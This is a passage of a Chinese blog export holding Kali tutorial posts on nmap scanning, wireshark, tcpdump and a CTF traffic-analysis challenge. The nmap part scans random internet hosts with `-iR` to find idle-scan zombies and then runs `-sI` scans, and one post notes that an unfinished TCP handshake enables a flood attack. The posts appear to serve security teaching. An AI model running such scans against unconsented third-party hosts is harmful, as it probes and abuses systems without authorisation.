<p>这个其实主要作用在于判断是不是windows操作系统，其他的用处感觉并不大。因为我们用的并不多。</p>
<p>如果使用-sF、-sX或者-sN扫描显示所有的端口都是关闭的，而使用-sS（SYN）扫描显示有打开的端口，你可以确定目标主机可能运行的是Windwos系统。因为微软忽略了一些标准，所以呢来说这个对于探测windows还是有点用的。</p>
<p>-sI</p>
<p>接下来我们在介绍一下僵尸主机扫描</p>
<p>在进行扫描之前我们需要先去找一台僵尸主机</p>
<p>首先我们输入</p>
<p>nmap -p80 –script ipidseq -iR 后面加上主机数量</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606827087.png" data-fancybox="group" data-caption="1540606827087" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606827087.png" alt="1540606827087" title="1540606827087"></a></p>
<p>很遗憾，这个需要运气成分，我们没有抓到一个开放的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606850903.png" data-fancybox="group" data-caption="1540606850903" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540606850903.png" alt="1540606850903" title="1540606850903"></a></p>
<p>再抓一次。</p>
<p>运气爆炸，抓到了</p>
<p>我们接下来就要进行扫描了。</p>
<p>然后我们输入语法</p>
<p>nmap -Pn -sI 这里是僵尸主机 这里是被扫描主机</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540607157358.png" data-fancybox="group" data-caption="1540607157358" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540607157358.png" alt="1540607157358" title="1540607157358"></a></p>
<p>这里好像探测结果错了，这个僵尸主机用不了。简单的介绍一下，如果感兴趣的话，可以回去试试。</p>
<h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><p> 本节主要介绍了一下nmap的基本语法，还有主机发现，端口探测的简单说明，其次我们也说了一下某些原理，端口的状态，下节课我们将继续深入nmap的讲解。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络探测</category>
      </categories>
      <tags>
        <tag>网络探测</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门-3 wireshark的使用（下）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-3-wireshark-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-8b-ef-bc-89/</url>
    <content><![CDATA[<p>kali工具入门-3 wireshark的使用（下）</p>
<h1 id="kali工具入门-3-wireshark的使用（下）"><a href="#kali工具入门-3-wireshark的使用（下）" class="headerlink" title="kali工具入门-3 wireshark的使用（下）"></a>kali工具入门-3 wireshark的使用（下）</h1><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 前面我们介绍了wireshark一些菜单的简单介绍，以及简单使用，在后面我们还简单的分析了一下三次握手。在本节我们会简单的分析一些http协议，还有前几天作者去玩靶场遇到的一个案例，最后我们会说一下tcpdump的简单使用。</p>
<p> –青花</p>
<h2 id="wireshark简单的分析http协议"><a href="#wireshark简单的分析http协议" class="headerlink" title="wireshark简单的分析http协议"></a>wireshark简单的分析http协议</h2><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014177563.png" data-fancybox="group" data-caption="1540014177563" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014177563.png" alt="1540014177563" title="1540014177563"></a></p>
<p>我们首先开启监听访问网络，筛选http协议。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014223455.png" data-fancybox="group" data-caption="1540014223455" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014223455.png" alt="1540014223455" title="1540014223455"></a></p>
<p>找到一个数据包右键追踪数据流，追踪TCP流。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014134870.png" data-fancybox="group" data-caption="1540014134870" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014134870.png" alt="1540014134870" title="1540014134870"></a></p>
<p>之后这里就是我们追踪到的一个HTTP了。</p>
<p>我们看上面是一个GET请求</p>
<p>我们分析一些这个GET请求</p>
<p>在HTTP中</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014784546.png" data-fancybox="group" data-caption="1540014784546" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540014784546.png" alt="1540014784546" title="1540014784546"></a></p>
<p>然后我们再来看一下http的响应头。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540024717138.png" data-fancybox="group" data-caption="1540024717138" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540024717138.png" alt="1540024717138" title="1540024717138"></a></p>
<p>响应头这里，状态码。大小长度，项目类型这些信息也都给我们显示出来了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540024759938.png" data-fancybox="group" data-caption="1540024759938" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540024759938.png" alt="1540024759938" title="1540024759938"></a></p>
<p>再往下面看就是一些内容了。</p>
<h2 id="墨者学院一个靶场的简单分析"><a href="#墨者学院一个靶场的简单分析" class="headerlink" title="墨者学院一个靶场的简单分析"></a>墨者学院一个靶场的简单分析</h2><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025410321.png" data-fancybox="group" data-caption="1540025410321" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025410321.png" alt="1540025410321" title="1540025410321"></a></p>
<p>首先我们来看一下题目。</p>
<p>这个来说就是叫我们分析一下流量查看其中是不是有可以数据。</p>
<p>我们下载下来文件是一个pacp的文件，这个是wireshark包的格式。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025682459.png" data-fancybox="group" data-caption="1540025682459" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025682459.png" alt="1540025682459" title="1540025682459"></a></p>
<p>我们现在开始分析流量。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025713986.png" data-fancybox="group" data-caption="1540025713986" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025713986.png" alt="1540025713986" title="1540025713986"></a></p>
<p>首先来说我们应该清楚一下，DNS（地址解析协议）还有SSDP（简单服务发现协议）这个传输数据可能性很低，所以我们先不必深究先看看其他的。</p>
<p>我们发现在上图中有TCP还有HTTP协议。</p>
<p>我们思考HTTP在进行运行的时候，下层要用TCP建立连接，这里是这么做得，我们跟进TCP流。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025962249.png" data-fancybox="group" data-caption="1540025962249" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540025962249.png" alt="1540025962249" title="1540025962249"></a></p>
<p>发现没有什么价值，这里只是一个请求还有返回一个页面。不过其中出现了upload这个是上传啊，但是在返回页面我们没有发现有价值的东西。不必灰心，继续向下面推进。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026044174.png" data-fancybox="group" data-caption="1540026044174" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026044174.png" alt="1540026044174" title="1540026044174"></a></p>
<p>我们发现下面这里出现了post请求，我们跟进一下看看。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026096033.png" data-fancybox="group" data-caption="1540026096033" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026096033.png" alt="1540026096033" title="1540026096033"></a></p>
<p>发现请求头响应内容并没有什么价值。继续跟进。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026163009.png" data-fancybox="group" data-caption="1540026163009" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026163009.png" alt="1540026163009" title="1540026163009"></a></p>
<p>下面又一串TCP的包。</p>
<p>我们跟进</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026206635.png" data-fancybox="group" data-caption="1540026206635" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026206635.png" alt="1540026206635" title="1540026206635"></a></p>
<p>发现这里面有FLAG哎。</p>
<p>下面的内容乱七八糟应该是图片内容，我们搜索一下flag看看是不是被隐写了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026249892.png" data-fancybox="group" data-caption="1540026249892" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540026249892.png" alt="1540026249892" title="1540026249892"></a></p>
<p>结果正中！</p>
<p>所以说这就是我们进行简单的流量分析的一个过程。</p>
<h2 id="TCPDUMP的使用"><a href="#TCPDUMP的使用" class="headerlink" title="TCPDUMP的使用"></a>TCPDUMP的使用</h2><p>TcpDump可以将网络中传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85/489739" target="_blank" rel="noopener">数据包</a>完全截获下来提供分析。它支持针对网络层、协议、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151" target="_blank" rel="noopener">主机</a>、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>
<p>我们可以在Linux终端中输入tcpdump是否已经安装。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540027565921.png" data-fancybox="group" data-caption="1540027565921" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540027565921.png" alt="1540027565921" title="1540027565921"></a></p>
<p>这个就在抓取一些数据包。</p>
<p>如果没有的话在centos系列系统中，我们可以输入yum install -y tcpdump</p>
<p>这个也比较简单。</p>
<p>我们这里再来介绍一下它的参数。</p>
<pre><code>tcpdump [ -adeflnNOpqStvx ] [ -c 数量 ] [ -F 文件名 ]
[ -i 网络接口 ] [ -r 文件名] [ -s snaplen ]
[ -T 类型 ] [ -w 文件名 ] [表达式 ]
1. tcpdump的选项介绍
-a 　将网络地址和广播地址转变成名字；
-d 　将匹配信息包的代码以人们能够理解的汇编格式给出；
-dd 　将匹配信息包的代码以c语言程序段的格式给出；
-ddd 　将匹配信息包的代码以十进制的形式给出；
-e 　在输出行打印出数据链路层的头部信息；
-f 　将外部的Internet地址以数字的形式打印出来；
-l 　使标准输出变为缓冲行形式；
-n 　不把网络地址转换成名字；
-t 　在输出的每一行不打印时间戳；
-v 　输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；
-vv 　输出详细的报文信息；
-c 　在收到指定的包的数目后，tcpdump就会停止；
-F 　从指定的文件中读取表达式,忽略其它的表达式；
-i 　指定监听的网络接口；
-r 　从指定的文件中读取包(这些包一般通过-w选项产生)；
-w 　直接将包写入文件中，并不分析和打印出来；
-T 　将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程
调用）和snmp（简单　网络管理协议；）</code></pre><p>这里面我们还有能够利用一些正规来表示。这个类似于wireshark的过滤规则，这里面我们就不详细说了。</p>
<p>这里面我们比如说，我们要抓icmp的包，然后给他写入一个文件。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028400696.png" data-fancybox="group" data-caption="1540028400696" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028400696.png" alt="1540028400696" title="1540028400696"></a></p>
<p>我们在终端输入命令开启监听。</p>
<p>另外在其他地方Ping</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028430242.png" data-fancybox="group" data-caption="1540028430242" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028430242.png" alt="1540028430242" title="1540028430242"></a></p>
<p>最后结束发现有包了，抓到了8个icmp的包。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028478432.png" data-fancybox="group" data-caption="1540028478432" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1540028478432.png" alt="1540028478432" title="1540028478432"></a></p>
<p>我们发现这个文件被存储了，我们可以把它弄到wireshark等工具分析啦！</p>
<p>这里只是作一个基本的介绍，如果想要深入的了解一下，还是要自己深入的进行研究啦。</p>
<h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><p> 最近说了一下网络协议的基本分析工具，这个也能够帮助我们更好地理解排除网络的故障，本文由于作者的个人能力原因，所以呢也不是很深入，不足之处还望请大家多多指教。能够跟大家一起多多学习进步。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络嗅探</category>
      </categories>
      <tags>
        <tag>网络嗅探</tag>
        <tag>工具</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门-3 wireshark的使用（中）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-3-wireshark-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-ad-ef-bc-89/</url>
    <content><![CDATA[<p>kali工具入门-3 wireshark的使用（中）</p>
<h1 id="kali工具入门-3-wireshark的使用（中）"><a href="#kali工具入门-3-wireshark的使用（中）" class="headerlink" title="kali工具入门-3 wireshark的使用（中）"></a>kali工具入门-3 wireshark的使用（中）</h1><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 上节我们介绍了wireshark的基本使用还有一些简单的功能，这里我们再来继续介绍wireshark的功能，由于作者能力有限涉及的面不是特别广，所以讲的不详尽，我们在此节会尽量的说说这些功能基本都是什么意思，一些常用的，在讲完之后我们可能会根据进度来分析一下协议，然后理解一下。</p>
<h3 id="分析菜单"><a href="#分析菜单" class="headerlink" title="分析菜单"></a>分析菜单</h3><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397186828.png" data-fancybox="group" data-caption="1539397186828" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397186828.png" alt="1539397186828" title="1539397186828"></a></p>
<p>我们继续来说分析菜单这一栏的作用。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397322039.png" data-fancybox="group" data-caption="1539397322039" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397322039.png" alt="1539397322039" title="1539397322039"></a></p>
<p>选中第一个，这里面我们看有一些过滤规则，我们可以自由定义。在我们添加定义完下一次就可以直接使用。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397660838.png" data-fancybox="group" data-caption="1539397660838" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397660838.png" alt="1539397660838" title="1539397660838"></a></p>
<p>这里我们可以定义一些wireshark会抓取的协议包，这里说明了，如果我们禁止有些相互关联的，可能会抓不到更加高层的协议，这里我们还是要注意一下的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397833966.png" data-fancybox="group" data-caption="1539397833966" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397833966.png" alt="1539397833966" title="1539397833966"></a></p>
<p>解码器，这里wireshark支持将某些数据包协议解码。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397974882.png" data-fancybox="group" data-caption="1539397974882" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539397974882.png" alt="1539397974882" title="1539397974882"></a></p>
<p>当我们选择了一个追踪流的时候，就会给我们单独弹出一个窗口进行专门的监听，在这里面我们可以监听注入说tcp,udp等等这些协议的流，但是我们要遵循流协议。</p>
<p>t: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: <em>/</em> Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: <a href="http://www.kali.org.cn/thread-26864-1-1.html" target="_blank" rel="noopener">http://www.kali.org.cn/thread-26864-1-1.html</a> Connection: keep-alive Pragma: no-cache Cache-Control: no-cache</p>
<p>比如说这里我们追踪一个http的流</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398288699.png" data-fancybox="group" data-caption="1539398288699" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398288699.png" alt="1539398288699" title="1539398288699"></a></p>
<p>这里我们看到请求还有回复等等东西。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398489949.png" data-fancybox="group" data-caption="1539398489949" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398489949.png" alt="1539398489949" title="1539398489949"></a></p>
<p>专家信息会给我们详尽的列出一些信息。</p>
<h3 id="统计菜单"><a href="#统计菜单" class="headerlink" title="统计菜单"></a>统计菜单</h3><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398559089.png" data-fancybox="group" data-caption="1539398559089" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398559089.png" alt="1539398559089" title="1539398559089"></a></p>
<p>这里我们来说一下统计里面的内容。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398625141.png" data-fancybox="group" data-caption="1539398625141" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398625141.png" alt="1539398625141" title="1539398625141"></a></p>
<p>捕获文件属性，这里说捕获文件的属性。我们可以再里面看分组信息，时间信息，帧的格式，等等信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398851068.png" data-fancybox="group" data-caption="1539398851068" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539398851068.png" alt="1539398851068" title="1539398851068"></a></p>
<p>协议分层，这里很详尽的按照协议所在的层次进行分层，这里我们看到ipv4,tcp,http协议等。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539399520246.png" data-fancybox="group" data-caption="1539399520246" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539399520246.png" alt="1539399520246" title="1539399520246"></a></p>
<p>这里可以显示意识数据交互的比较具体的信息，我们也可以拉倒别的地方绘图，显示的更加直观。这个窗口会实时更新，我们在什么时候打开都会看到。像什么分组端点，什么I/O图表啥的，都是为了能够更加直观的告诉我们这些。</p>
<p>更加详尽的我们可以参考<a href="https://www.wireshark.org/docs/wsug_html_chunked/ChUseStatisticsMenuSection.html" target="_blank" rel="noopener">官方文档</a></p>
<h3 id="电话菜单"><a href="#电话菜单" class="headerlink" title="电话菜单"></a>电话菜单</h3><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403198012.png" data-fancybox="group" data-caption="1539403198012" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403198012.png" alt="1539403198012" title="1539403198012"></a></p>
<p>这里我们来简单的说明一下电话菜单的内容。</p>
<p>Voip通话，这个显示捕获的流量中所有检测到的VoIP呼叫的列表。它通过信号发现呼叫。 这里面定义的好多都是和电话内容有关的一些监听操作，由于本人能力有限，大家有兴趣的可以参考<a href="https://www.wireshark.org/docs/wsug_html_chunked/ChUseTelephonyMenuSection.html" target="_blank" rel="noopener">这里</a></p>
<p>无线监听</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403451526.png" data-fancybox="group" data-caption="1539403451526" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403451526.png" alt="1539403451526" title="1539403451526"></a></p>
<p>在这里面我们可以监听无限的一些信息，这里显示蓝牙，WLAN，看看真的很强大，功能很强劲。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403502654.png" data-fancybox="group" data-caption="1539403502654" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403502654.png" alt="1539403502654" title="1539403502654"></a></p>
<p>工具这里面我们定义了防火墙的过滤规则， 这里面用的iptables放行一些内容。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403540178.png" data-fancybox="group" data-caption="1539403540178" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403540178.png" alt="1539403540178" title="1539403540178"></a></p>
<p>帮助里面我们可以看一些帮助内容，可以帮助我们更好地理解这个工具。</p>
<h2 id="2-wireshark使用"><a href="#2-wireshark使用" class="headerlink" title="2 wireshark使用"></a>2 wireshark使用</h2><p>上面讲的菜单信息基本到这里就介绍完了，我们现在开始正式来说工具使用啦！</p>
<p>上面我们说了怎么去抓一段内容，并且对内容进行简单的过滤，这里呢，我们来抓个包实战分析一下，毕竟我们的终极目的是要学习，wireshark能够帮助我们更好地了解这些内容，实战确实是帮助我们提升最快的方法。</p>
<h3 id="2-1-TCP三次握手的分析"><a href="#2-1-TCP三次握手的分析" class="headerlink" title="2.1 TCP三次握手的分析"></a>2.1 TCP三次握手的分析</h3><p>我们知道在TCP建立连接的时候回经历三次握手</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403936123.png" data-fancybox="group" data-caption="1539403936123" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539403936123.png" alt="1539403936123" title="1539403936123"></a></p>
<p>我们来说明一下，这里在客户端首先会发送一个请求，说我想要跟你建立连接，然后就会发送一个包，这里面有一个SYN标志，然后等待服务端回复。</p>
<p>当服务端回复的时候这时候就会回复一个ACK+1，代表收到这个请求，另外会等这个回复确认，这时候就会在置一个sqe，然后最后在置ACK=K+1代表确认建立连接（这里有一个缺陷，那就是最后一步这里，这里我们可以永远不回复最后一步，一直挂起，可能构造洪泛攻击）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539418674032.png" data-fancybox="group" data-caption="1539418674032" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539418674032.png" alt="1539418674032" title="1539418674032"></a></p>
<p>这里面我们访问一个网址，首先在底层传输层会有tcp协议的调用。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539418774598.png" data-fancybox="group" data-caption="1539418774598" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539418774598.png" alt="1539418774598" title="1539418774598"></a></p>
<p>然后我们用wireshark抓包查看，这里我们看到了一堆请求。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419523361.png" data-fancybox="group" data-caption="1539419523361" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419523361.png" alt="1539419523361" title="1539419523361"></a></p>
<p>我们这里看第一个数据包，这里面设定syn为1。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419668524.png" data-fancybox="group" data-caption="1539419668524" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419668524.png" alt="1539419668524" title="1539419668524"></a></p>
<p>第二个包，这里ACK还有SYN都设定回复。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419731253.png" data-fancybox="group" data-caption="1539419731253" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1539419731253.png" alt="1539419731253" title="1539419731253"></a></p>
<p>最后一个包确定ACK的位置，成功建立三次握手。</p>
<h3 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h3><p> 本次我们又介绍了了一些wireshark的菜单内容，由于涉猎不够广泛，电话蓝牙，无线哪方便作者没有深入了解，所以就只能拿本人还比较熟悉的这些协议来说一下，简单的介绍一下tcp三次握手的建立过程。另外在下节课我们再来抓包体会一下http协议或者其他的这些协议的内部，了解其原理。最后我还会介绍一下wireshark，因为我们常常用不到gui在好多时候还是要用tcpdump的。</p>
]]></content>
      <categories>
        <category>kali学习</category>
        <category>网络嗅探</category>
      </categories>
      <tags>
        <tag>网络嗅探</tag>
        <tag>工具</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具入门-3 wireshark的使用（上）</title>
    <url>/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-3-wireshark-e7-9a-84-e4-bd-bf-e7-94-a8/</url>
    <content><![CDATA[<p>kali工具入门-3 wireshark的使用</p>
<h2 id="kali工具入门-3-wireshark的使用（上）"><a href="#kali工具入门-3-wireshark的使用（上）" class="headerlink" title="kali工具入门-3 wireshark的使用（上）"></a>kali工具入门-3 wireshark的使用（上）</h2><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p> 上节我们说到用aircrack攻击wifi，不知道大家有没有体验了一下呢。是不是很好玩？本节我们将说一下数据包的分析，因为我们在许多时候排除网络故障后者对网络进行窥探监听的时候，数据包对于我们来说都是十分重要的！这里我们就来说明一下一款抓包神器，wireshark，除此之外还有许多优秀的抓包工具，比如说tcpdump，charles等等。这里在kali这里我们就来说说大家常常会提到的wireshark，本来是想一篇写完这个wireshark的，但是我看了一些文章，还有官方文档，想想如果讲的太少真的是对不起这么优秀的工具，那么我就尽我所能，尽可能的多说一点。除此之外如果还有时间的话我也会给大家介绍一下tcpdump(这个在linux平台使用的很常见)。</p>
<h2 id="1-wireshark"><a href="#1-wireshark" class="headerlink" title="1 wireshark"></a>1 wireshark</h2><p> wireshark是一款抓包嗅探的工具，有助于我们抓取各种网络协议的数据包，对于故障排除，检查问题，以及更加深入的理解网络协议来说是一款神器。这里我们来介绍一下简单使用，并且抓几个包分析分析。</p>
<h3 id="1-1安装"><a href="#1-1安装" class="headerlink" title="1.1安装"></a>1.1安装</h3><p> 安装这个我们在kali上自带，windows是傻瓜式的。至于Linux的安装，我们可以看<a href="https://blog.csdn.net/magiclyj/article/details/77231707" target="_blank" rel="noopener">这里</a></p>
<p> 这里介绍了ubuntu还有redhat两个版本，我们的kali还有ubuntu都是基于debian的操作大抵相同。</p>
<p> MAC平台wireshark也是支持的，这里我们同样推荐一篇文章，可以点击<a href="https://yq.aliyun.com/ziliao/75541" target="_blank" rel="noopener">这里</a></p>
<h3 id="1-2-wireshark的基本使用"><a href="#1-2-wireshark的基本使用" class="headerlink" title="1.2 wireshark的基本使用"></a>1.2 wireshark的基本使用</h3><p>在使用wireshark之前，我们要知道一下wireshark可以做什么，不可以做什么。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538825292366.png" data-fancybox="group" data-caption="1538825292366" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538825292366.png" alt="1538825292366" title="1538825292366"></a></p>
<p>上面我们说了一下那个wireshark可以做什么，比如说可以帮我们排除网络故障啊，或者帮助我们更好的理解网络协议等等。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538732809713.png" data-fancybox="group" data-caption="1538732809713" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538732809713.png" alt="1538732809713" title="1538732809713"></a></p>
<p>终端输入wireshark打开wireshark，打开之后式gui页面。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538732837307.png" data-fancybox="group" data-caption="1538732837307" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538732837307.png" alt="1538732837307" title="1538732837307"></a></p>
<p>之后我们打开wireshark。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733050145.png" data-fancybox="group" data-caption="1538733050145" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733050145.png" alt="1538733050145" title="1538733050145"></a></p>
<p>打开之后我们看到这里，这里我们看到好多说是过滤器，我们看第一个eth0是不是很熟悉啊，这个就是我们的网卡。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733198034.png" data-fancybox="group" data-caption="1538733198034" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733198034.png" alt="1538733198034" title="1538733198034"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733453469.png" data-fancybox="group" data-caption="1538733453469" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1538733453469.png" alt="1538733453469" title="1538733453469"></a></p>
<p>当然我们也可以点击这里切换更多监听的接口这里有许多设备，wireshark会捕获流经我们网卡的包。然后我们可以进行抓取分析。</p>
<p>当我们选定了一个设备之后就会开始进行抓包，这里面我们发现好多包，一开始都是一些arp（地址解析协议）</p>
